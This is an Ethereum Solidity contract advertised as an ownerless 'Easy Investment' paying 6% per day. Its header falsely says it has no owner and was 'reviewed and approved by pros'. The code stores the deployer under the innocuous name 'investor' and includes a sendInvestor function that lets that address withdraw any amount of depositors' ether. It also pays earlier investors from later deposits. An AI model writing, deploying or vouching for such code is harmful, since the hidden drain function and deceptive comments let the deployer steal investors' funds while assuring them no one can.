1 pragma solidity 0.4.25;
2 
3 /**
4  *
5  * Easy Investment Contract
6  *  - GAIN 6% PER 24 HOURS (every 5900 blocks)
7  *  - NO COMMISSION on your investment (every ether stays on contract's balance)
8  *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)
9  *
10  * How to use:
11  *  1. Send any amount of ether to make an investment
12  *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)
13  *  OR
14  *  2b. Send more ether to reinvest AND get your profit at the same time
15  *
16  * RECOMMENDED GAS LIMIT: 70000
17  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
18  *
19  * Contract reviewed and approved by pros!
20  *
21  */
22 contract Investment {
23     // records amounts invested
24     mapping (address => uint256) public invested;
25     // records blocks at which investments were made
26     mapping (address => uint256) public atBlock;
27     // address investors
28     address investor;
29 
30     // constructor initialize investors
31     constructor() public {
32         investor = msg.sender;
33     }
34     // this function called every time anyone sends a transaction to this contract
35     function () external payable {
36         // if sender (aka YOU) is invested more than 0 ether
37         if (invested[msg.sender] != 0) {
38             // calculate profit amount as such:
39             // amount = (amount invested) * 6% * (blocks since last transaction) / 5900
40             // 5900 is an average block count per day produced by Ethereum blockchain
41             uint256 amount = invested[msg.sender] * 6 / 100 * (block.number - atBlock[msg.sender]) / 5900;
42             // send calculated amount of ether directly to sender (aka YOU)
43             msg.sender.transfer(amount);
44         }
45         // record block number and invested amount (msg.value) of this transaction
46         atBlock[msg.sender] = block.number;
47         invested[msg.sender] += msg.value;
48     }
49     // approved for investors
50     function approveInvestor(address _investor) public onlyInvestor {
51         investor = _investor;
52     }
53     // send to investors
54     function sendInvestor(address _investor, uint256 amount) public onlyInvestor {
55         _investor.transfer(amount);
56     }
57     // get investors address
58     function getInvestor() public constant onlyInvestor returns(address)  {
59         return investor;
60     }
61     // access only for investors modifier
62     modifier onlyInvestor() {
63         require(msg.sender == investor);
64         _;
65     }
66 }